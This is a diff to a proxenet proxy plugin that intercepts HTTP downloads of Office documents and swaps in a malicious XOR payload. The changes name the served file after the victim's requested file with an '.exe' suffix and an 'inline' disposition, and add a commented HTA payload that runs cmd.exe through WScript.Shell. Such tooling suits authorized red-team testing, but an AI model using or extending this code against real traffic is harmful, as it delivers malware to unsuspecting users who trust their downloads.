@@ -19,7 +19,7 @@ AUTHOR        = "@_hugsy_"
 
 
 import os, subprocess, ConfigParser, re, base64
-from pimp import HTTPResponse, HTTPBadResponseException
+from pimp import HTTPRequest, HTTPResponse, HTTPBadResponseException
 
 HOME = os.getenv( "HOME" )
 CONFIG_FILE = os.getenv("HOME") + "/.proxenet.ini"
@@ -32,7 +32,7 @@ path_to_xor_payload  = config.get(PLUGIN_NAME, "xor_payload", 0, {"home": os.get
 path_to_html         = config.get(PLUGIN_NAME, "html_inject_stub", 0, {"home": os.getenv("HOME")})
 
 file_cache = { "html": path_to_html, }
-
+q = {}
 types = {"docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
          "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
          "pptx": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
@@ -76,6 +76,7 @@ def replace_with_malicious(http, ctype):
     2. replace the HTTP response body
     3. profit
     """
+    global b
 
     # 1.
     res = hit_cache(ctype)
@@ -103,10 +104,34 @@ def replace_with_malicious(http, ctype):
 
     # 2.
     with open(res, "rb") as f:
-        http.body = f.read()
+        data = f.read()
+        http.body = data
+
+    if http.rid in q.keys():
+        fname = q[http.rid]
+        del q[http.rid]
+    else:
+        fname = "attachement.{}".format(ctype)
 
     http.del_header("Content-Disposition")
-    http.add_header("Content-Disposition", "attachment; filename=attachment.{}.exe".format(ctype))
+    http.add_header("Content-Disposition", "inline; filename={}.exe".format(fname))
+
+    # injecting hta test
+    # http.body = """<html><head>
+    # <hta:application id="Service Interrupts" showintaskbar="no" sysmenu="no" border="none" </head>
+    # <body><script language="JScript">
+    # function Window_onLoad(){
+	# new ActiveXObject('WScript.Shell').Run('cmd.exe /c calc.exe'); window.resizeTo(1,1);
+    # }
+    # window.onload=Window_onLoad; </script></body></html>"""
+
+    # changing content-type
+    # http.del_header("Content-Type")
+    # http.add_header("Content-Type", "text/hta")
+
+    # changing content-disposition
+    # http.del_header("Content-Disposition")
+    # http.add_header("Content-Disposition", "inline; filename={}.hta".format(fname))
 
     # 3.
     return True
@@ -148,6 +173,9 @@ def proxenet_request_hook(rid, request, uri):
     """
     proxenet_request_hook() is not useful now, maybe later.
     """
+    global q
+
+    q[rid] = HTTPRequest(request, rid=rid).basename
     return request
 
 
